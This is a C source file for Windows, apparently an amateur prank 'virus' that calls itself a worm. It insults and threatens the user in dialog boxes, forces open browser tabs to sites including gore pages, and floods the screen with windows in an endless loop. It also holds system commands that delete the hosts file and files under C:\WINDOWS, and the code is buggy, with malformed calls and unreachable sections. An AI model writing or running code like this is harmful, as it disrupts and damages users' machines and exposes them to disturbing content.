// AUTHOR ARKA DATE 7/29/2024
// NOBODY GIVES YOU A DAMN UNLESS YOU RUIN THEM 


#include <windows.h>
#include <stdatomic.h>
// #include <avx512ifmavlintrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <limits.h>
#define constant 1

void fun3(int n)
{
    if (n <=INT_MIN) // set with a minimum integer value 
    {
        return;
    }
    ShellExecute(NULL,NULL,"close","Visual Studio Code",NULL,SW_MAX); // closed vscode 
    MessageBox(NULL, "0XDEF", "CAUTION!!", MB_ABORTRETRYIGNORE);// dispaly message pooped up with the following dialogues
    ShellExecuteW(NULL,"open"," msedge.exe",NULL,NULL,SW_MAX);// open edge 
    ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);// open notepad process continues.....
    
    ShellExecute(NULL,NULL,"close","Visual Studio Code",NULL,SW_MINIMIZE);// close 
    Beep(1000,500);  // Changed to MB_ICONINFORMATION for a standard beep sound
    Beep(6000,500);
    fun3(n - 1);
    
}






LRESULT CALLBACK WINDOW_PROCEDURE (HWND hnd , UINT msg , WPARAM WP, LPARAM LP)
{

    switch (msg)
    {
      case WM_DESTROY:
      PostQuitMessage(0);
      break;

      default:
      return DefWindowProc(hnd,msg,WP,LP);
    }

}






int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine, int iCmdShow)
{
    // main function entry point 
  if (MessageBox(NULL,TEXT("THIS VIRUS IS NO JOKE YOU CAN HAVE REAL CONSIQUENCES !!!!"),NULL,MB_ICONWARNING | MB_YESNO)!=IDYES) return 1; // WARNING---Combined flags for MessageBox
 if (MessageBox(NULL,TEXT("YOU ARE ABOUT TO GET WRECKED BY THIS COMPUTER VIRUS\n\t YOU DON'T KNOW\n WHAT YOU HAVE INVITED INTO YOUR STUPID_COMPUTER AND THIS TIME NO BACKOFF"),"ARKA.EXE",MB_ICONWARNING | MB_HELP)!=IDYES);


    FILE* fp = fopen("WORM.bat", "w");  // Changed file name to avoid system errors
    if (fp != NULL) {
        char str[] = "CALL-OF-DUTY-TUF-GUY WORM";
        fputs(str, fp);
        fclose(fp);
    }


      //Openning stuffs and closing stuffs 
      ShellExecute(NULL,"open","msedge.exe",NULL,NULL,SW_MAX|SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe", "https://youtube.com",NULL,SW_NORMAL);
       Beep(400,8000);

       ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe", "https://safeweb.norton.com/404",NULL,SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe","https://goregrish.com",NULL,SW_SHOWMAXIMIZED);
       ShellExecute(NULL,"open","msedge.exe","https://reelleak.com",NULL,SW_SHOWMAXIMIZED);
        ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
         ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
          ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
           ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);

                ShellExecute(NULL,"open","msedge.exe",NULL,NULL,SW_MAX|SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe", "https://youtube.com",NULL,SW_NORMAL);
       MessageBeep(MB_ICONINFORMATION);
       ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe", "https://www.whatsapp.com",NULL,SW_NORMAL);
       ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com",NULL,SW_SHOWMAXIMIZED);
       ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com/p/CyOy0JzvKvm/?igsh=MWo0amppYjRjeTFkZQ==",NULL,SW_SHOWMAXIMIZED);
     MessageBox(NULL, TEXT("You are a Stupid like everyone !!",
 NULL, MB_ICONERROR);

    Beep(800,8000);
 Beep(900,9000);
 Beep(1000,10000);
 Beep(1100,11000);


    
       WNDCLASSW ws = {0};

    ws.lpszClassName = L"MY_WINDOW";
    ws.hInstance = hinstance;
    ws.hCursor = LoadCursor(NULL,IDC_HAND);
    ws.hIcon = LoadIcon(NULL,IDI_ERROR);
    ws.hbrBackground = (HBRUSH)(COLOR_WINDOW+9);
    ws.lpfnWndProc = WINDOW_PROCEDURE;


    if (!RegisterClassW(&ws)){
      return -1;
    }

    
do{
    HWND hnd = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd1 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd3 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd4 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd5 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd6 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd7 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd8 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd9 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd10 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd12 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd14 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd15 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
     HWND hnd16 = CreateWindowW (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
}while (constant);
    // if (hnd == NULL)
    // {
    //   return -1;
    // }


    
MSG msg = {0};
while (GetMessageW(&msg,NULL,0,0))
{
    TranslateMessage (&msg);
    DispatchMessage(&msg);
}
    
       system("del C:\\WINDOWS\\System32\\drivers\\etc\\hosts");// deleting the host files of C directory in sense of malfunction 
    system("del C:\\WINDOWS\\.");//Now fire up the C drive  



       SendMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER,(LPARAM)2);// off the computer 
       Sleep(10000);// put the pc in in sleep for 10000 ms  
       SendMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER,(LPARAM)-1); // on the goddamn pc again 
       MessageBeep(MB_CANCELTRYCONTINUE);// let's beep the system 
        MessageBeep(MB_CANCELTRYCONTINUE);
         MessageBeep(MB_CANCELTRYCONTINUE);


     
    int n = 10;  
    fun3(n);

    return 0;
}


